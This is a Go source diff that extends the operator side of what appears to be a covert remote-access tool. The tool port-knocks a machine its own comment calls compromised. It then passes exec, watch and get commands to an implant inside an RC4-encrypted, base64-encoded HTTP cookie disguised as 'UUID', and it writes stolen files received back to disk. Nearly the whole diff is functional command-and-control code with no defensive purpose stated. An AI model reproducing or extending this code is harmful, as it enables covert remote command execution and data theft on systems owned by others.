@@ -2,6 +2,9 @@ package main
 
 import (
 	"bufio"
+	"crypto/rc4"
+	"encoding/base64"
+	"fmt"
 	"io"
 	"net"
 	"net/http"
@@ -11,13 +14,19 @@ import (
 )
 
 type cookieHandler struct {
-	commands  chan string
+	commands  chan []byte
 	responses chan string
 }
 
+const (
+	EXEC  byte = 1
+	WATCH byte = 2
+	GET   byte = 3
+)
+
 var (
-	fileMap = make(map[int]io.Writer)
-	fileicr = 0
+	fileMap      = make(map[byte]io.WriteCloser)
+	seqNum  byte = 0
 )
 
 func main() {
@@ -30,7 +39,7 @@ func main() {
 
 	var c cookieHandler
 
-	c.commands = make(chan string)
+	c.commands = make(chan []byte)
 	c.responses = make(chan string)
 
 	//execute port knocking on comprmised machine
@@ -53,12 +62,12 @@ func portKnock(ip string, port1 string, port2 string, port3 string) {
 	conn, err := net.Dial("udp", ip+":"+port1)
 	conn.Write([]byte(""))
 	connectionError(err)
-	time.Sleep(time.Second)
+	time.Sleep(time.Millisecond * 100)
 	conn.Close()
 	conn, err = net.Dial("udp", ip+":"+port2)
 	connectionError(err)
 	conn.Write([]byte(""))
-	time.Sleep(time.Second)
+	time.Sleep(time.Millisecond * 100)
 	conn.Close()
 	conn, err = net.Dial("udp", ip+":"+port3)
 	connectionError(err)
@@ -88,7 +97,9 @@ func (c cookieHandler) ServeHTTP(writer http.ResponseWriter, request *http.Reque
 
 	var myCookie http.Cookie
 	select {
-	case myCookie.Value = <-c.commands:
+
+	case cmd := <-c.commands:
+		myCookie.Value = encrypt(cmd)
 		myCookie.Name = "UUID"
 		myCookie.MaxAge = 50
 		myCookie.Secure = false
@@ -101,13 +112,14 @@ func (c cookieHandler) ServeHTTP(writer http.ResponseWriter, request *http.Reque
 	io.WriteString(writer, "Hello world!")
 }
 
-func acceptCommandFromStdin(acceptedCommand chan string) {
+func acceptCommandFromStdin(acceptedCommand chan<- []byte) {
 
 	//forever read from stdin
 
 	buffer := bufio.NewReader(os.Stdin)
 
 	for {
+
 		line, err := buffer.ReadBytes('\n')
 
 		if err != nil {
@@ -115,6 +127,7 @@ func acceptCommandFromStdin(acceptedCommand chan string) {
 		}
 
 		splitCommands := strings.Split(strings.TrimSpace(string(line)), " ")
+		commandBuf := make([]byte, 0, 3)
 
 		switch splitCommands[0] {
 		case "get":
@@ -123,35 +136,75 @@ func acceptCommandFromStdin(acceptedCommand chan string) {
 				continue
 			}
 
-			file, err := os.Open(splitCommands[2])
+			file, err := os.Create(splitCommands[2])
 			if err != nil {
-				print("file opening failed")
+				fmt.Printf("file opening failed: %v", err.Error())
 				continue
 			}
-			fileMap[fileicr] = file
-			fileicr++
+			fileMap[seqNum] = file
+
+			commandBuf = append(commandBuf, GET, seqNum)
+
+			seqNum++
+
+			commandBuf = append(commandBuf, []byte(splitCommands[1])...)
 
 		case "watch":
+			commandBuf = append(commandBuf, WATCH, seqNum)
+			seqNum++
+
+			commandBuf = append(commandBuf, []byte(splitCommands[1])...)
+
 		case "exec":
+			commandBuf = append(commandBuf, EXEC, seqNum)
+			seqNum++
+
+			for _, cmd := range splitCommands[1:] {
+				commandBuf = append(commandBuf, []byte(cmd)...)
+				commandBuf = append(commandBuf, 0x20)
+			}
+
 		case "chdir":
 		default:
+			println("dumbass")
+			continue
 
 		}
 
-		//acceptedCommand <-
+		acceptedCommand <- commandBuf
 
 	}
 }
 
-func handleResponse(channelResponses chan string) {
-
-	//write a map of concurrent filehandles
-
+func handleResponse(channelResponses <-chan string) {
 	for {
+		//write a map of concurrent filehandles
+		data := decrypt(<-channelResponses)
 
-		println(<-channelResponses)
+		fmt.Println("recieved response\n\n")
+
+		switch data[0] {
+		case EXEC:
+			fmt.Println(string(data[2:]))
+		case WATCH:
+			fmt.Printf("Activity on watch : %v", string(data[2:]))
+		case GET:
+			if len(data) == 2 {
+				fileMap[data[1]].Close()
+				fmt.Println("closing file")
+			} else {
+
+				fmt.Println("adding to file")
+				fileMap[data[1]].Write(data[2:])
+			}
+		default:
+			fmt.Printf("invalid type : %v", data[0])
+		}
+
+		fmt.Println("end response\n\n")
+		//fmt.Printf("%v %v: %v", data[0], data[1], string(data[2:]))
+
 	}
-
 }
 
 func connectionError(err error) {
@@ -159,4 +212,30 @@ func connectionError(err error) {
 		print(err)
 		os.Exit(1)
 	}
+}
+
+func decrypt(data string) []byte {
+
+	decoded, _ := base64.RawStdEncoding.DecodeString(data)
+
+	ciper, err := rc4.NewCipher([]byte("myKey"))
+	if err != nil {
+		print(err)
+	}
+	ciper.XORKeyStream(decoded, decoded)
+
+	return []byte(decoded)
+}
+
+func encrypt(data []byte) string {
+
+	ciper, err := rc4.NewCipher([]byte("myKey"))
+	if err != nil {
+		print(err)
+	}
+	ciper.XORKeyStream(data, data)
+
+	var encoded = base64.RawStdEncoding.EncodeToString(data)
+
+	return string(encoded)
 }
